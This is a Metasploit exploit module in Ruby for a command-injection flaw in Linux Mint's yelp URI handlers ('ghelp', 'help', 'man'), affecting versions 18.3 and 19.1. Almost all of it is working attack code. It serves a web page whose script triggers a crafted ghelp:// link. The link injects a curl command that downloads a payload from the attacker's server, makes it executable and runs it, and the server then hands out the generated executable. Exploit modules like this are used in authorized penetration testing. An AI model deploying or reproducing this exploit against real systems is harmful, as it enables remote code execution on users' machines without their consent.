# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Exploit from github repro: https://github.com/b1ack0wl/linux_mint_poc
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Linux Mint &#039;yelp&#039; URI handler command injection vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability within the "ghelp", "help" and "man" URI handlers within 
          Linux Mint&#039;s "ubuntu-system-adjustments" package. Invoking any one the URI handlers will call 
          the python script "/usr/local/bin/yelp" with the contents of the supplied URI handler as its argument. 
          The script will then search for the strings "gnome-help" or "ubuntu-help" and if doesn&#039;t find either 
          of them it&#039;ll then execute os.system("/usr/bin/yelp %s" % args). User interaction is required to exploit 
          this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;b1ack0wl&#039; # vuln discovery and exploit dev
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 60
        },
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux Mint 18.3 and 19.1&#039;,
            {
              &#039;Arch&#039; => ARCH_X64
            } 
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039;  => 0))
  end

  def generate_exploit_html()
    if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
      srv_host = datastore[&#039;LHOST&#039;]
    else
      srv_host = datastore[&#039;SRVHOST&#039;]
    end
    @filename = rand_text_alpha(4)
    cmd_inj = "curl http://#{srv_host}:#{datastore[&#039;SRVPORT&#039;]}/#{@service_path} -o /tmp/#{@filename};chmod 777 /tmp/#{@filename};/tmp/#{@filename} &".gsub(&#039; &#039;,&#039;$IFS$()&#039;) # Cheap way to add spaces since chrome percent encodes spaces (%20).
    html = %Q|
    <html>
    <head>
      <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
      <meta content="utf-8" http-equiv="encoding">
      <title>paparoachfanclubdotcom</title>
    </head>
    <body>
    <script>
      lmao = document.createElement(&#039;a&#039;);
      lmao.href= "ghelp://$(#{cmd_inj})";
      document.body.appendChild(lmao); /* Needed to work with Firefox */
      lmao.click();
    </script>
    </body>
    </html>
    |
    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    if agent =~ /curl\/\d/
      # Command has been executed. Serve up the payload
      exe_payload = generate_payload_exe()
      print_status("Sending payload...")
      send_response(cli, exe_payload)
      register_file_for_cleanup("/tmp/#{@filename}")
      return
    else
      html = generate_exploit_html()
      print_status("Sending HTML...")
      send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
  end
end

